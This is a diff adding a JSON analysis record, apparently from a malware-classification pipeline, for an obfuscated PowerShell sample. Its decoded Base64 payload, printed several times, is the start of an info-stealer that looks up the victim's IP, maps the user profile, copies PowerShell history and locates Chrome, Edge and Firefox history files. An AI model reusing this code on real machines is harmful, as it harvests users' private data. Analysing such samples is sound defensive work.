@@ -1,0 +1,63 @@
+{
+  "meta": {
+    "quelldatei": "tech_038_Moar64.ps1",
+    "sha256": "1fec9d5392fbf24a9f5f894b3013c448386df2b0d53274221d9a830b789a48b7",
+    "groesse_bytes": 12429,
+    "zeilen": 2,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 12428,
+        "dekodiert": "function AR {\n    param (\n        [string]$wh\n    )\n\n    $ipInfoApiUrl = \"http://ip-api.com/json\"\n    $outputFile = \"$env:TEMP\\AR.txt\"\n    $browserDataFile = \"$env:TEMP\\BrowserData.txt\" \n\n    function Get-AdditionalData {\n        param (\n            [string]$FolderName\n        )\n\n        tree $Env:userprofile /a /f >> $env:TEMP\\$FolderName\\tree.txt\n\n        Copy-Item \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -Destination $env:TEMP\\$FolderName\\Powershell-History.txt\n    }\n\n\n    function Get-BrowserData {\n\n        [CmdletBinding()]\n        param (\t\n        [Parameter (Position=1,Mandatory = $True)]\n        [string]$Browser,    \n        [Parameter (Position=2,Mandatory = $True)]\n        [string]$DataType \n        ) \n\n        $Regex = '(http|https)://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n\n        $Search = $null\n\n        if ($DataType -eq 'history') {\n            $Search = 'http'\n        }\n\n        if ($Browser -eq 'chrome') {\n            $Path = \"$Env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\"\n        }\n        elseif ($Browser -eq 'edge') {\n            $Path = \"$Env:USERPROFILE\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History\"\n        }\n        elseif ($Browser -eq 'firefox') {\n            $Path = Get-ChildItem \"$Env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\places.sqlite\" | Select-Object -ExpandProperty FullName -First 1\n        }\n\n        if (Test-Path $Path) {\n            $Value = Get-Content -Path $P"
+      }
+    ],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 12428,
+        "dekodiert": "function AR {\n    param (\n        [string]$wh\n    )\n\n    $ipInfoApiUrl = \"http://ip-api.com/json\"\n    $outputFile = \"$env:TEMP\\AR.txt\"\n    $browserDataFile = \"$env:TEMP\\BrowserData.txt\" \n\n    function Get-AdditionalData {\n        param (\n            [string]$FolderName\n        )\n\n        tree $Env:userprofile /a /f >> $env:TEMP\\$FolderName\\tree.txt\n\n        Copy-Item \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -Destination $env:TEMP\\$FolderName\\Powershell-History.txt\n    }\n\n\n    function Get-BrowserData {\n\n        [CmdletBinding()]\n        param (\t\n        [Parameter (Position=1,Mandatory = $True)]\n        [string]$Browser,    \n        [Parameter (Position=2,Mandatory = $True)]\n        [string]$DataType \n        ) \n\n        $Regex = '(http|https)://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n\n        $Search = $null\n\n        if ($DataType -eq 'history') {\n            $Search = 'http'\n        }\n\n        if ($Browser -eq 'chrome') {\n            $Path = \"$Env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\"\n        }\n        elseif ($Browser -eq 'edge') {\n            $Path = \"$Env:USERPROFILE\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History\"\n        }\n        elseif ($Browser -eq 'firefox') {\n            $Path = Get-ChildItem \"$Env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\places.sqlite\" | Select-Object -ExpandProperty FullName -First 1\n        }\n\n        if (Test-Path $Path) {\n            $Value = Get-Content -Path $P"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 12428,
+        "dekodiert": "function AR {\n    param (\n        [string]$wh\n    )\n\n    $ipInfoApiUrl = \"http://ip-api.com/json\"\n    $outputFile = \"$env:TEMP\\AR.txt\"\n    $browserDataFile = \"$env:TEMP\\BrowserData.txt\" \n\n    function Get-AdditionalData {\n        param (\n            [string]$FolderName\n        )\n\n        tree $Env:userprofile /a /f >> $env:TEMP\\$FolderName\\tree.txt\n\n        Copy-Item \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -Destination $env:TEMP\\$FolderName\\Powershell-History.txt\n    }\n\n\n    function Get-BrowserData {\n\n        [CmdletBinding()]\n        param (\t\n        [Parameter (Position=1,Mandatory = $True)]\n        [string]$Browser,    \n        [Parameter (Position=2,Mandatory = $True)]\n        [string]$DataType \n        ) \n\n        $Regex = '(http|https)://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n\n        $Search = $null\n\n        if ($DataType -eq 'history') {\n            $Search = 'http'\n        }\n\n        if ($Browser -eq 'chrome') {\n            $Path = \"$Env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\"\n        }\n        elseif ($Browser -eq 'edge') {\n            $Path = \"$Env:USERPROFILE\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History\"\n        }\n        elseif ($Browser -eq 'firefox') {\n            $Path = Get-ChildItem \"$Env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\places.sqlite\" | Select-Object -ExpandProperty FullName -First 1\n        }\n\n        if (Test-Path $Path) {\n            $Value = Get-Content -Path $P"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "ZnVuY3Rpb24gQVIgewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJHdoCiAgICApCgogICAgJGlwSW5mb0FwaVVybCA9ICJodHRwOi8vaXAtYXBpLmNvbS9qc29uIgogICAgJG91dHB1dEZpbGUgPSAiJGVudjpURU1QXEFSLnR4dCIKICAgICRicm93c2VyRGF0YUZpbGUgPSAiJGVudjpURU1QXEJyb3dzZXJEYXRhLnR4dCIgCgogICAgZnVuY3Rpb24gR2V0LUFkZGl0aW9uYWxEYXRhIHsKICAgICAgICBwYXJhbSAoCiAgICAgICAgICAgIFtzdHJpbmddJEZvbGRlck5hbWUKICAgICAgICApCgogICAgICAgIHRyZWUgJEVudjp1c2VycHJvZmlsZSAvYSAvZiA+PiAkZW52OlRFTVBcJEZvbGRlck5hbWVcdHJlZS50eHQKCiAgICAgICAgQ29weS1JdGVtICIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0IiAtRGVzdGluYXRpb24gJGVudjpURU1QXCRGb2xkZXJOYW1lXFBvd2Vyc2hlbGwtSGlzdG9yeS50eHQKICAgIH0KCgogICAgZnVuY3Rpb24gR2V0LUJyb3dzZXJEYXRhIHsKCiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0KICAgICAgICBwYXJhbSAoCQogICAgICAgIFtQYXJhbWV0ZXIgKFBvc2l0aW9uPTEsTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtzdHJpbmddJEJyb3dzZXIsICAgIAogICAgICAgIFtQYXJhbWV0ZXIgKFBvc2l0aW9uPTIsTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtzdHJpbmddJERhdGFUeXBlIAogICAgICAgICkgCgogICAgICAgICRSZWdleCA9ICcoaHR0cHxodHRwcyk6Ly8oW1x3LV0rXC4pK1tcdy1dKygvW1x3LSAuLz8lJj1dKikqPycKCiAgICAgICAgJFNlYXJjaCA9ICRudWxsCgogICAgICAgIGlmICgkRGF0YVR5cGUgLWVxICdoaXN0b3J5JykgewogICAgICAgICAgICAkU2VhcmNoID0gJ2h0dHAnCiAgICAgICAgfQoKICAgICAgICBpZiAoJEJyb3dzZXIgLWVxICdjaHJvbWUnKSB7CiAgICAgICAgICAgICRQYXRoID0gIiRFbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XEhpc3RvcnkiCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJEJyb3dzZXIgLWVxICdlZGdlJykgewogICAgICAgICAgICAkUGF0aCA9ICIkRW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcSGlzdG9yeSIKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkQnJvd3NlciAtZXEgJ2ZpcmVmb3gnKSB7CiAgICAgICAgICAgICRQYXRoID0gR2V0LUNoaWxkSXRlbSAiJEVudjpBUFBEQVRBXE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1wqLmRlZmF1bHQtcmVsZWFzZVxwbGFjZXMuc3FsaXRlIiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEZ1bGxOYW1lIC1GaXJzdCAxCiAgICAgICAgfQoKICAgICAgICBpZiAoVGVzdC1QYXRoICRQYXRoKSB7CiAgICAgICAgICAgICRWYWx1ZSA9IEdldC1Db250ZW50IC1QYXRoICRQ",
+    "dekodierte_befehle": [
+      "function AR {\n    param (\n        [string]$wh\n    )\n\n    $ipInfoApiUrl = \"http://ip-api.com/json\"\n    $outputFile = \"$env:TEMP\\AR.txt\"\n    $browserDataFile = \"$env:TEMP\\BrowserData.txt\" \n\n    function Get-AdditionalData {\n        param (\n            [string]$FolderName\n        )\n\n        tree $Env:userprofile /a /f >> $env:TEMP\\$FolderName\\tree.txt\n\n        Copy-Item \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -Destination $env:TEMP\\$FolderName\\Powershell-History.txt\n    }\n\n\n    function Get-BrowserData {\n\n        [CmdletBinding()]\n        param (\t\n        [Parameter (Position=1,Mandatory = $True)]\n        [string]$Browser,    \n        [Parameter (Position=2,Mandatory = $True)]\n        [string]$DataType \n        ) \n\n        $Regex = '(http|https)://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n\n        $Search = $null\n\n        if ($DataType -eq 'history') {\n            $Search = 'http'\n        }\n\n        if ($Browser -eq 'chrome') {\n            $Path = \"$Env:U"
+    ],
+    "beobachtete_abfolge": []
+  }
+}
